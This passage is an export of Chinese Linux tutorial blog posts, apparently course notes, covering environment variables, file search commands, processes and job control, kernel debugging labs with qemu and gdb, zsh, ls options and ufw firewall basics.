环境变量简单理解了变量的概念，就很容易理解环境变量了。环境变量的作用域比自定义变量的要大，如 Shell 的环境变量作用于自身和它的子进程。在所有的 UNIX 和类 UNIX 系统中，每个进程都有其各自的环境变量设置，且默认情况下，当一个进程被创建时，除了创建过程中明确指定的话，它将继承其父进程的绝大部分环境设置。Shell 程序也作为一个进程运行在操作系统之上，而我们在 Shell 中运行的大部分命令都将以 Shell 的子进程的方式运行。 通常我们会涉及到的变量类型有三种： 当前 Shell 进程私有用户自定义变量，如上面我们创建的 tmp 变量，只在当前 Shell 中有效。 Shell 本身内建的变量。 从自定义变量导出的环境变量。 也有三个与上述三种环境变量相关的命令：set，env，export。这三个命令很相似，都是用于打印环境变量信息，区别在于涉及的变量范围不同。详见下表： 命 令 说 明 set 显示当前 Shell 所有变量，包括其内建环境变量（与 Shell 外观等相关），用户自定义变量及导出的环境变量。 env 显示与当前用户相关的环境变量，还可以让命令在指定环境中运行。 export 显示从 Shell 中导出成环境变量的变量，也能通过它将自定义变量导出为环境变量。 你可以更直观的使用 vimdiff 工具比较一下它们之间的差别： 12345temp=shiyanlouexport temp_env=shiyanlouenv|sort&gt;env.txtexport|sort&gt;export.txtset|sort&gt;set.txt 上述操作将命令输出通过管道 | 使用 sort 命令排序，再重定向到对象文本文件中。管道的概念后面我们会学到，现在你知道这是什么意思就行了。 1vimdiff env.txt export.txt set.txt 使用 vimdiff 工具比较导出的几个文件的内容，退出 vimdiff 需要按下 Esc 后输入 :q 即可退出。 关于哪些变量是环境变量，可以简单地理解成在当前进程的子进程有效则为环境变量，否则不是（有些人也将所有变量统称为环境变量，只是以全局环境变量和局部环境变量进行区分，我们只要理解它们的实质区别即可）。我们这里用 export 命令来体会一下，先在 Shell 中设置一个变量 temp=shiyanlou，然后再新创建一个子 Shell 查看 temp 变量的值： 注意：为了与普通变量区分，通常我们习惯将环境变量名设为大写。 永久生效但是问题来了，当你关机后，或者关闭当前的 shell 之后，环境变量就没了啊。怎么才能让环境变量永久生效呢？ 按变量的生存周期来划分，Linux 变量可分为两类： 永久的：需要修改配置文件，变量永久生效； 临时的：使用 export 命令行声明即可，变量在关闭 shell 时失效。 这里介绍两个重要文件 /etc/bashrc（有的 Linux 没有这个文件） 和 /etc/profile ，它们分别存放的是 shell 变量和环境变量。还有要注意区别的是每个用户目录下的一个隐藏文件： 123# .profile 可以用 ls -a 查看cd /home/shiyanlouls -a 这个 .profile 只对当前用户永久生效。因为它保存在当前用户的 Home 目录下，当切换用户时，工作目录可能一并被切换到对应的目录中，这个文件就无法生效。而写在 /etc/profile 里面的是对所有用户永久生效，所以如果想要添加一个永久生效的环境变量，只需要打开 /etc/profile，在最后加上你想添加的环境变量就好啦。 1. 命令的查找路径与顺序查看 PATH 环境变量的内容： 1echo $PATH 默认情况下你会看到如下输出： 1/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games 如果你还记得 Linux 目录结构那一节的内容，你就应该知道上面这些目录下放的是哪一类文件了。通常这一类目录下放的都是可执行文件，当我们在 Shell 中执行一个命令时，系统就会按照 PATH 中设定的路径按照顺序依次到目录中去查找，如果存在同名的命令，则执行先找到的那个。 2 添加自定义路径到 PATH 环境变量在前面我们应该注意到 PATH 里面的路径是以 : 作为分割符的，所以我们可以这样添加自定义路径： 1PATH=$PATH:/home/shiyanlou/mybin 注意这里一定要使用绝对路径。 3 修改和删除已有变量变量修改变量的修改有以下几种方式： 变量设置方式 说明 $&#123;变量名#匹配字串&#125; 从头向后开始匹配，删除符合匹配字串的最短数据 $&#123;变量名##匹配字串&#125; 从头向后开始匹配，删除符合匹配字串的最长数据 $&#123;变量名%匹配字串&#125; 从尾向前开始匹配，删除符合匹配字串的最短数据 $&#123;变量名%%匹配字串&#125; 从尾向前开始匹配，删除符合匹配字串的最长数据 $&#123;变量名/旧的字串/新的字串&#125; 将符合旧字串的第一个字串替换为新的字串 $&#123;变量名//旧的字串/新的字串&#125; 将符合旧字串的全部字串替换为新的字串 比如我们可以修改前面添加到 PATH 的环境变量，将添加的 mybin 目录从环境变量里删除。为了避免操作失误导致命令找不到，我们先将 PATH 赋值给一个新的自定义变量 mypath： 12345mypath=$PATHecho $mypathmypath=$&#123;mypath%/home/shiyanlou/mybin&#125;# 或使用通配符 * 表示任意多个任意字符mypath=$&#123;mypath%*/mybin&#125; 可以看到路径已经不存在了。 变量删除可以使用 unset 命令删除一个环境变量： 1unset mypath 4 让环境变量立即生效前面我们在 Shell 中修改了一个配置脚本文件之后（比如 zsh 的配置文件 home 目录下的 .zshrc），每次都要退出终端重新打开甚至重启主机之后其才能生效，很是麻烦，我们可以使用 source 命令来让其立即生效，如： 12cd /home/shiyanlousource .zshrc source 命令还有一个别名就是 .，上面的命令如果替换成 . 的方式就该是： 1. ./.zshrc 在使用 . 的时候，需要注意与表示当前路径的那个点区分开。 注意第一个点后面有一个空格，而且后面的文件必须指定完整的绝对或相对路径名，source 则不需要。 2 搜索文件与搜索相关的命令常用的有 whereis，which，find 和 locate。 whereis 简单快速 12whereis whowhereis find 你会看到 whereis find 找到了三个路径，两个可执行文件路径和一个 man 在线帮助文件所在路径，这个搜索很快，因为它并没有从硬盘中依次查找，而是直接从数据库中查询。 whereis 只能搜索二进制文件（-b），man 帮助文件（-m）和源代码文件（-s）。如果想要获得更全面的搜索结果可以使用 locate 命令。 locate 快而全 使用 locate 命令查找文件也不会遍历硬盘，它通过查询 /var/lib/mlocate/mlocate.db 数据库来检索信息。不过这个数据库也不是实时更新的，系统会使用定时任务每天自动执行 updatedb 命令来更新数据库。所以有时候你刚添加的文件，它可能会找不到，需要手动执行一次 updatedb 命令（在我们的环境中必须先执行一次该命令）。注意这个命令也不是内置的命令，在部分环境中需要手动安装，然后执行更新。 123sudo apt-get updatesudo apt-get install locatesudo updatedb 它可以用来查找指定目录下的不同文件类型，如查找 /etc 下所有以 sh 开头的文件： 1locate /etc/sh 注意，它不只是在 &#x2F;etc 目录下查找，还会自动递归子目录进行查找。 查找 /usr/share/ 下所有 jpg 文件： 1locate /usr/share/*.jpg 环境里使用 zsh，在 ~/.zshrc 文件里添加了 setopt nonomatch 配置，这样就不会自动处理和修复命令，因此可以不使用 \\ 转义。如果其他环境中执行该命令提示 zsh: no matches found: /usr/share/*.jpg，则可以在 .zshrc 中添加上述配置，或者使用 \\ 转义。 如果想只统计数目可以加上 -c 参数，-i 参数可以忽略大小写进行查找，whereis 的 -b、-m、-s 同样可以使用。 which 小而精 which 本身是 Shell 内建的一个命令，我们通常使用 which 来确定是否安装了某个指定的程序，因为它只从 PATH 环境变量指定的路径中去搜索命令并且返回第一个搜索到的结果。也就是说，我们可以看到某个系统命令是否存在以及执行的到底是哪一个地方的命令。 123which manwhich nginxwhich ping find 精而细 find 应该是这几个命令中最强大的了，它不但可以通过文件类型、文件名进行查找而且可以根据文件的属性（如文件的时间戳，文件的权限等）进行搜索。find 命令强大到，要把它讲明白至少需要单独好几节课程才行，我们这里只介绍一些常用的内容。 这条命令表示去 /etc/ 目录下面 ，搜索名字叫做 interfaces 的文件或者目录。这是 find 命令最常见的格式，千万记住 find 的第一个参数是要搜索的地方。命令前面加上 sudo 是因为 shiyanlou 只是普通用户，对 /etc 目录下的很多文件都没有访问的权限，如果是 root 用户则不用使用。 1sudo find /etc/ -name interfaces 注意 find 命令的路径是作为第一个参数的， 基本命令格式为 find [path][option] [action] 。 与时间相关的命令参数： 参数 说明 -atime 最后访问时间 -ctime 最后修改文件内容的时间 -mtime 最后修改文件属性的时间 下面以 -mtime 参数举例： -mtime n：n 为数字，表示为在 n 天之前的“一天之内”修改过的文件 -mtime +n：列出在 n 天之前（不包含 n 天本身）被修改过的文件 -mtime -n：列出在 n 天之内（包含 n 天本身）被修改过的文件 -newer file：file 为一个已存在的文件，列出比 file 还要新的文件名 列出 home 目录中，当天（24 小时之内）有改动的文件： 1find ~ -mtime 0 列出用户家目录下比 &#x2F;etc 目录新的文件： 1find ~ -newer /etc","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux基础入门","slug":"A-OS/Linux/Linux基础入门","permalink":"http://example.com/categories/A-OS/Linux/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"Linux基础入门15 Linux进程概念","date":"2023-10-27T01:24:01.843Z","path":"A_OS/Linux/Linux基础入门/15 Linux 进程概念/","text":"Linux 进程概念 [toc] 1 概念的理解首先程序与进程是什么？程序与进程又有什么区别？ 程序（procedure）：不太精确地说，程序就是执行一系列有逻辑、有顺序结构的指令，帮我们达成某个结果。就如我们去餐馆，给服务员说我要牛肉盖浇饭，她执行了做牛肉盖浇饭这么一个程序，最后我们得到了这么一盘牛肉盖浇饭。它需要去执行，不然它就像一本武功秘籍，放在那里等人翻看。 进程（process）：进程是程序在一个数据集合上的一次执行过程，在早期的 UNIX、Linux 2.4 及更早的版本中，它是系统进行资源分配和调度的独立基本单位。同上一个例子，就如我们去了餐馆，给服务员说我要牛肉盖浇饭，她执行了做牛肉盖浇饭这么一个程序，而里面做饭的是一个进程，做牛肉汤汁的是一个进程，把牛肉汤汁与饭混合在一起的是一个进程，把饭端上桌的是一个进程。它就像是我们在看武功秘籍这么一个过程，然后一个篇章一个篇章地去练。 简单来说，程序是为了完成某种任务而设计的软件，比如 vim 是程序。什么是进程呢？进程就是运行中的程序。 程序只是一些列指令的集合，是一个静止的实体，而进程不同，进程有以下的特性： 动态性：进程的实质是一次程序执行的过程，有创建、撤销等状态的变化。而程序是一个静态的实体。 并发性：进程可以做到在一个时间段内，有多个程序在运行中。程序只是静态的实体，所以不存在并发性。 独立性：进程可以独立分配资源，独立接受调度，独立地运行。 异步性：进程以不可预知的速度向前推进。 结构性：进程拥有代码段、数据段、PCB（进程控制块，进程存在的唯一标志）。也正是因为有结构性，进程才可以做到独立地运行。 并发：在一个时间段内，宏观来看有多个程序都在活动，有条不紊的执行（每一瞬间只有一个在执行，只是在一段时间有多个程序都执行过） 并行：在每一个瞬间，都有多个程序都在同时执行，这个必须有多个 CPU 才行 引入进程是因为传统意义上的程序已经不足以描述 OS 中各种活动之间的动态性、并发性、独立性还有相互制约性。程序就像一个公司，只是一些证书，文件的堆积（静态实体）。而当公司运作起来就有各个部门的区分，财务部，技术部，销售部等等，就像各个进程，各个部门之间可以独立运作，也可以有交互（独立性、并发性）。 而随着程序的发展越做越大，又会继续细分，从而引入了线程的概念，当代多数操作系统、Linux 2.6 及更新的版本中，进程本身不是基本运行单位，而是线程的容器。就像上述所说的，每个部门又会细分为各个工作小组（线程），而工作小组需要的资源需要向上级（进程）申请。 线程（thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。因为线程中几乎不包含系统资源，所以执行更快、更有效率。 简而言之，一个程序至少有一个进程，一个进程至少有一个线程。线程的划分尺度小于进程，使得多线程程序的并发性高。另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。 2 进程的属性2.1 进程的分类大概明白进程是个什么样的存在后，我们需要进一步了解的就是进程分类。可以从两个角度来分： 以进程的功能与服务的对象来分； 以应用程序的服务类型来分； 第一个角度来看，我们可以分为用户进程与系统进程： 用户进程：通过执行用户程序、应用程序或称之为内核之外的系统程序而产生的进程，此类进程可以在用户的控制下运行或关闭。 系统进程：通过执行系统内核程序而产生的进程，比如可以执行内存资源分配和进程切换等相对底层的工作；而且该进程的运行不受用户的干预，即使是 root 用户也不能干预系统进程的运行。 第二角度来看，我们可以将进程分为交互进程、批处理进程、守护进程： 交互进程：由一个 shell 终端启动的进程，在执行过程中，需要与用户进行交互操作，可以运行于前台，也可以运行在后台。 批处理进程：该进程是一个进程集合，负责按顺序启动其他的进程。 守护进程：守护进程是一直运行的一种进程，在 Linux 系统启动时启动，在系统关闭时终止。它们独立于控制终端并且周期性的执行某种任务或等待处理某些发生的事件。例如 httpd 进程，一直处于运行状态，等待用户的访问。还有经常用的 cron（在 centOS 系列为 crond）进程，这个进程为 crontab 的守护进程，可以周期性的执行用户设定的某些任务。 2.2 进程的衍生进程有这么多的种类，那么进程之间定是有相关性的，而这些有关联性的进程又是如何产生的，如何衍生的？ 就比如我们启动了终端，就是启动了一个 bash 进程，我们可以在 bash 中再输入 bash 则会再启动一个 bash 的进程，此时第二个 bash 进程就是由第一个 bash 进程创建出来的，他们之间又是个什么关系？ 我们一般称呼第一个 bash 进程是第二 bash 进程的父进程，第二 bash 进程是第一个 bash 进程的子进程，这层关系是如何得来的呢？ 关于父进程与子进程便会提及这两个系统调用 fork() 与 exec() fork-exec是由 Dennis M. Ritchie 创造的 fork() 是一个系统调用（system call），它的主要作用就是为当前的进程创建一个新的进程，这个新的进程就是它的子进程，这个子进程除了父进程的返回值和 PID 以外其他的都一模一样，如进程的执行代码段，内存信息，文件描述，寄存器状态等等 exec() 也是系统调用，作用是切换子进程中的执行程序也就是替换其从父进程复制过来的代码段与数据段 子进程就是父进程通过系统调用 fork() 而产生的复制品，fork() 就是把父进程的 PCB 等进程的数据结构信息直接复制过来，只是修改了 PID，所以一模一样，只有在执行 exec() 之后才会不同，而早先的 fork() 比较消耗资源后来进化成 vfork()，效率高了不少，感兴趣的同学可以查查为什么。 这就是子进程产生的由来。简单的实现逻辑就如下方所示： 123456789pid_t p;p = fork();if (p == (pid_t) -1) /* ERROR */else if (p == 0) /* CHILD */else /* PARENT */ 既然子进程是通过父进程而衍生出来的，那么子进程的退出与资源的回收定然与父进程有很大的相关性。当一个子进程要正常的终止运行时，或者该进程结束时它的主函数 main() 会执行 exit(n); 或者 return n，这里的返回值 n 是一个信号，系统会把这个 SIGCHLD 信号传给其父进程，当然若是异常终止也往往是因为这个信号。 在将要结束时的子进程代码执行部分已经结束执行了，系统的资源也基本归还给系统了，但若是其进程的进程控制块（PCB）仍驻留在内存中，而它的 PCB 还在，代表这个进程还存在（因为 PCB 就是进程存在的唯一标志，里面有 PID 等消息），并没有消亡，这样的进程称之为僵尸进程（Zombie）。 如图中第四列标题是 S，S 表示的是进程的状态，而在下属的第三行的 Z 表示的是 Zombie 的意思。（ ps 命令将在后续详解） 正常情况下，父进程会收到两个返回值：exit code（SIGCHLD 信号）与 reason for termination 。之后，父进程会使用 wait(&amp;status) 系统调用以获取子进程的退出状态，然后内核就可以从内存中释放已结束的子进程的 PCB；而如若父进程没有这么做的话，子进程的 PCB 就会一直驻留在内存中，一直留在系统中成为僵尸进程（Zombie）。 虽然僵尸进程是已经放弃了几乎所有内存空间，没有任何可执行代码，也不能被调度，在进程列表中保留一个位置，记载该进程的退出状态等信息供其父进程收集，从而释放它。但是 Linux 系统中能使用的 PID 是有限的，如果系统中存在有大量的僵尸进程，系统将会因为没有可用的 PID 从而导致不能产生新的进程。 另外如果父进程结束（非正常的结束），未能及时收回子进程，子进程仍在运行，这样的子进程称之为孤儿进程。在 Linux 系统中，孤儿进程一般会被 init 进程所“收养”，成为 init 的子进程。由 init 来做善后处理，所以它并不至于像僵尸进程那样无人问津，不管不顾，大量存在会有危害。 进程 0 是系统引导时创建的一个特殊进程，也称之为内核初始化，其最后一个动作就是调用 fork() 创建出一个子进程运行 /sbin/init 可执行文件，而该进程就是 PID&#x3D;1 的进程 1，而进程 0 就转为交换进程（也被称为空闲进程），进程 1 （init 进程）是第一个用户态的进程，再由它不断调用 fork() 来创建系统里其他的进程，所以它是所有进程的父进程或者祖先进程。同时它是一个守护程序，直到计算机关机才会停止。 通过以下的命令我们可以很明显的看到这样的结构 1pstree 或者从此图我们可以更加形象的看清子父进程的关系 通过以上的显示结果我们可以看的很清楚，init 为所有进程的父进程或者说是祖先进程 我们还可以使用这样一个命令来看，其中 pid 就是该进程的一个唯一编号，ppid 就是该进程的父进程的 pid，command 表示的是该进程通过执行什么样的命令或者脚本而产生的 1ps －fxo user,ppid,pid,pgid,command 可以在图中看见我们执行的 ps 就是由 zsh 通过 fork-exec 创建的子进程而执行的 使用这样的一个命令我们也能清楚的看见 init 如上文所说是由进程 0 这个初始化进程来创建出来的子进程，而其他的进程基本是由 init 创建的子进程，或者是由它的子进程创建出来的子进程。所以 init 是用户进程的第一个进程也是所有用户进程的父进程或者祖先进程。（ps 命令将在后续课程详解） 就像一个树状图，而 init 进程就是这棵树的根，其他进程由根不断的发散，开枝散叶 2.3 进程组与Sessions每一个进程都会是一个进程组的成员，而且这个进程组是唯一存在的，他们是依靠 PGID（process group ID）来区别的，而每当一个进程被创建的时候，它便会成为其父进程所在组中的一员。 一般情况，进程组的 PGID 等同于进程组的第一个成员的 PID，并且这样的进程称为该进程组的领导者，也就是领导进程，进程一般通过使用 getpgrp() 系统调用来寻找其所在组的 PGID，领导进程可以先终结，此时进程组依然存在，并持有相同的 PGID，直到进程组中最后一个进程终结。 与进程组类似，每当一个进程被创建的时候，它便会成为其父进程所在 Session 中的一员，每一个进程组都会在一个 Session 中，并且这个 Session 是唯一存在的， Session 主要是针对一个 tty 建立，Session 中的每个进程都称为一个工作(job)。每个会话可以连接一个终端(control terminal)。当控制终端有输入输出时，都传递给该会话的前台进程组。Session 意义在于将多个 jobs 囊括在一个终端，并取其中的一个 job 作为前台，来直接接收该终端的输入输出以及终端信号。 其他 jobs 在后台运行。 前台（foreground）就是在终端中运行，能与你有交互的 后台（background）就是在终端中运行，但是你并不能与其任何的交互，也不会显示其执行的过程 2.4 工作管理bash(Bourne-Again shell)支持工作控制（job control），而 sh（Bourne shell）并不支持。 并且每个终端或者说 bash 只能管理当前终端中的 job，不能管理其他终端中的 job。比如我当前存在两个 bash 分别为 bash1、bash2，bash1 只能管理其自己里面的 job 并不能管理 bash2 里面的 job 我们都知道当一个进程在前台运作时我们可以用 ctrl + c 来终止它，但是若是在后台的话就不行了。 我们可以通过 &amp; 这个符号，让我们的命令在后台中运行： 1ls &amp; 图中所显示的 [1] 236分别是该 job 的 job number 与该进程的 PID，而最后一行的 Done 表示该命令已经在后台执行完毕。 我们还可以通过 ctrl + z 使我们的当前工作停止并丢到后台中去 被停止并放置在后台的工作我们可以使用这个命令来查看： 1jobs 其中第一列显示的为被放置后台 job 的编号，而第二列的 ＋ 表示最近(刚刚、最后)被放置后台的 job，同时也表示预设的工作，也就是若是有什么针对后台 job 的操作，首先对预设的 job，- 表示倒数第二（也就是在预设之前的一个）被放置后台的工作，倒数第三个（再之前的）以后都不会有这样的符号修饰，第三列表示它们的状态，而最后一列表示该进程执行的命令。 我们可以通过这样的一个命令将后台的工作拿到前台来： 123# 后面不加参数提取预设工作，加参数提取指定工作的编号# ubuntu 在 zsh 中需要 %，在 bash 中不需要 %fg [%jobnumber] 之前我们通过 ctrl + z 使得工作停止放置在后台，若是我们想让其在后台运作我们就使用这样一个命令： 12#与fg类似，加参则指定，不加参则取预设bg [%jobnumber] 既然有方法将被放置在后台的工作提至前台或者让它从停止变成继续运行在后台，当然也有方法删除一个工作，或者重启等等。 12345# kill的使用格式如下kill -signal %jobnumber# signal从1-64个信号值可以选择，可以这样查看kill －l 其中常用的有这些信号值 信号值 作用 -1 重新读取参数运行，类似与 restart -2 如同 ctrl+c 的操作退出 -9 强制终止该任务 -15 正常的方式终止该任务 若是在使用 kill ＋信号值然后直接加 pid，你将会对 pid 对应的进程进行操作。 若是在使用 kill+信号值然后 ％jobnumber，这时所操作的对象是 job，这个数字就是就当前 bash 中后台的运行的 job 的 ID。","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"进程与程序","slug":"进程与程序","permalink":"http://example.com/tags/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%A8%8B%E5%BA%8F/"},{"name":"进程的衍生","slug":"进程的衍生","permalink":"http://example.com/tags/%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%A1%8D%E7%94%9F/"},{"name":"工作管理","slug":"工作管理","permalink":"http://example.com/tags/%E5%B7%A5%E4%BD%9C%E7%AE%A1%E7%90%86/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux基础入门","slug":"A-OS/Linux/Linux基础入门","permalink":"http://example.com/categories/A-OS/Linux/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"Linux 内核分析配套实验","date":"2023-10-27T01:24:01.842Z","path":"A_OS/Linux/Linux内核分析配套实验/Readme/","text":"linux 内核分析配套实验学习记录本节记录实验楼Linux内核学习记录 1 完成一个简单的时间片轮转躲到程序内核代码 2 跟踪分析Linux内核的启动过程","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux内核分析配套实验","slug":"A-OS/Linux/Linux内核分析配套实验","permalink":"http://example.com/categories/A-OS/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/"}]},{"title":"Linux内核2 跟踪分析Linux内核的启动过程","date":"2023-10-27T01:24:01.841Z","path":"A_OS/Linux/Linux内核分析配套实验/2 跟踪分析Linux内核的启动过程/","text":"使用实验楼的虚拟机打开 shell 12cd ~/LinuxKernel/qemu -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img 内核启动完成后进入 menu程序（《软件工程 C 编码实践篇》的课程项目），支持三个命令 help、version 和 quit，您也可以添加更多的命令，对选修过《软件工程 C 编码实践篇》的童鞋应该是 a piece of cake. 使用 gdb 跟踪调试内核 12345678$ qemu -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img -s -S# 关于-s和-S选项的说明：# 1. -S# -S freeze CPU at startup (use ’c’ to start execution)# 2. -s# -s shorthand for -gdb tcp::1234# 若不想使用1234端口，则可以使用-gdb tcp:xxxx来取代-s选项 另开一个 shell 窗口 12345678910111213# 打开 GDB 调试器$ gdb# 在 GDB 中输入以下命令：# 在gdb界面中targe remote之前加载符号表（gdb）file linux-3.18.6/vmlinux# 建立gdb和gdbserver之间的连接,按c 让qemu上的Linux继续运行（gdb）target remote:1234# 断点的设置可以在target remote之前，也可以在之后（gdb）break start_kernel","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux内核分析配套实验","slug":"A-OS/Linux/Linux内核分析配套实验","permalink":"http://example.com/categories/A-OS/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/"}]},{"title":"Linux终端工具——zsh","date":"2023-10-27T01:24:01.840Z","path":"A_OS/Linux/Command&Tools/zsh/","text":"[toc] zsh安装 查看当前系统装了哪些shell 1cat /etc/shell 当前正在运行的是哪个版本的shell 1echo $SHELL 安装zsh 1sudo apt-get -y install zsh 切换zsh 1chsh -s /bin/zsh（非实时，需重启） 查看zsh的主题有哪些 1ls ~/.oh-my-zsh/themes/","tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"shell","slug":"shell","permalink":"http://example.com/tags/shell/"},{"name":"zsh","slug":"zsh","permalink":"http://example.com/tags/zsh/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Command&Tools","slug":"A-OS/Linux/Command-Tools","permalink":"http://example.com/categories/A-OS/Linux/Command-Tools/"}]},{"title":"linux 内核1 完成一个简单的时间片轮转躲到程序内核代码","date":"2023-10-27T01:24:01.840Z","path":"A_OS/Linux/Linux内核分析配套实验/1 完成一个简单的时间片轮转躲到程序内核代码/","text":"使用实验楼的虚拟机打开 shell 12345678910111213# 注意路径是区分大小的$ cd ~/LinuxKernel/linux-3.9.4$ rm -rf mykernel$ patch -p1 &lt; ../mykernel_for_linux3.9.4sc.patch$ make allnoconfig# 编译内核请耐心等待$ make$ qemu -kernel arch/x86/boot/bzImage 然后 cd mykernel 您可以看到 qemu 窗口输出的内容的代码 mymain.c 和 myinterrupt.c 注意：修改代码后需要 make 重新编译之后才能生效哦。 使用自己的 Linux 系统环境搭建过程参见 mykernel，其中也可以找到一个简单的时间片轮转多道程序内核代码","tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux内核分析配套实验","slug":"A-OS/Linux/Linux内核分析配套实验","permalink":"http://example.com/categories/A-OS/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/"}]},{"title":"ls命令详解","date":"2023-10-27T01:24:01.838Z","path":"A_OS/Linux/Command&Tools/ls/","text":"[toc] 参数 ls :列出文件或者目录 -l，使用长格式显示 -a，显示文件名以.开头的隐藏文件 -h，以human易读格式显示，主要是看容量的时候使用KB MB GB，指当前文件夹目录的大小 -lh ,文件或者目录大小的, 方便识别 -lhS ,文件从大到小排序 -lg ,不打印所有者信息 -ln ,打印UID和GID -l --si si以1000为单位，而-h以1024为单位。 -l --block-size=M: 设置文件显示单位 -li，显示inode号 -r，reverse，改变归类的顺序，例如和-t配合使用，-tr和-t显示顺序是颠倒的。 -R，递归列出子目录 -lX/ -l --sort=extension：扩展名排序 -t，按照修改时间顺序归类文件。 -d，列出目录本身的信息，而不是目录里边的内容。 字节 字节相关单位： K &#x3D; Kilobyte 千字节M &#x3D; Megabyte 兆字节G &#x3D; Gigabyte 十亿字节T &#x3D; Terabyte 兆兆字节P &#x3D; Petabyte 10的15次方字节E &#x3D; Exabyte 艾字节Z &#x3D; Zettabyte 泽它字节或皆字节Y &#x3D; Yottabyte 尧字节 命令 -a: 显示所有档案以及目录（ls内定将档案或目录名称为“.&#x2F;..”的视为隐藏） -A: 显示除隐藏文件“.&#x2F;..”以外的所有文件列表 -b: 将文件中的不可输出的字符以反斜线加字符编码的方式输出 -c : 与”-lt“ 选项连用时，按照文件状态时间排序输出目录内容， 排序的依据是文件的索引节点中的ctime 字段。 与”-l“连用时，排序的依据是文件的状态改变时间。 -C: 多列显示输出结果（只有文件名信息） -d : 仅显示目录名，而不显示目录下的内容列表， 显示符号链接文件本身， 而不显示其指定的目录列表。 -F: 在每个输出项后最佳文件的类型标识符， * 可执行权限的普通文件，&#x2F; 表示目录， @ 表示符号链接，|表示命令管道， &#x3D; 表示sockets 套接字， 普通文件不输出标识符。 -h: 以human易读格式显示， 文件大小以kb,mb显示 -i : 显示文件索引节点号（inode）,一个索引节点代表一个文件 -l : 以长格式显示目录下的内容列表，输出信息：文件名，文件类型，权限模式，硬链接数，所有者，组，文件大小， 文件最后修改时间。 ls - l 命令就是常用 ll -L : 如果遇到性质为符号链接的文件或目录， 直接列出该链接所造的原始文件或目录 -m: 以逗号分隔每个文件和目录的名称 -n : 以用户标志码和群组识别码替代其名称uid &#x2F;gid -r : 以文件名反序排序并输出目录内容列表 -R：递归处理，将制定目录下的所有文件及子目录一并处理 -s : 显示文件和目录的大小， 以区块为单位 -t : 用文件和目录的更改时间排序","tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"命令","slug":"命令","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Command&Tools","slug":"A-OS/Linux/Command-Tools","permalink":"http://example.com/categories/A-OS/Linux/Command-Tools/"}]},{"title":"linux防火墙命令——ufw","date":"2023-10-27T01:24:01.838Z","path":"A_OS/Linux/Command&Tools/ufw/","text":"防火墙是计算机安全的重要组成部分。在Linux中，UFW（Uncomplicated Firewall）是一个开源防火墙工具，可用于实现网络安全策略。它提供了一个简化的命令行接口，使得设置防火墙规则更加容易。在本文中，我们将介绍如何在Linux上使用UFW实现防火墙和安全策略。 [toc] 安装UFW许多Linux发行版都默认安装了UFW。如果你的Linux发行版没有安装，你可以使用以下命令来安装： 1$ sudo apt-get install ufw # Ubuntu和Debian 1$ sudo yum install ufw # CentOS和Fedora 设置UFW规则在使用UFW之前，必须启用它。使用以下命令来启用UFW： 1$ sudo ufw enable 默认情况下，UFW将拒绝所有传入连接和允许所有传出连接。要添加其他规则，可以使用以下命令： 1$ sudo ufw allow [port]/[protocol] 例如，启用SSH连接： 1$ sudo ufw allow ssh 默认情况下，UFW假定TCP协议。如果要允许其他协议，可以使用以下命令： 1$ sudo ufw allow [port]/[protocol] 例如，启用UDP连接： 1$ sudo ufw allow 53/udp 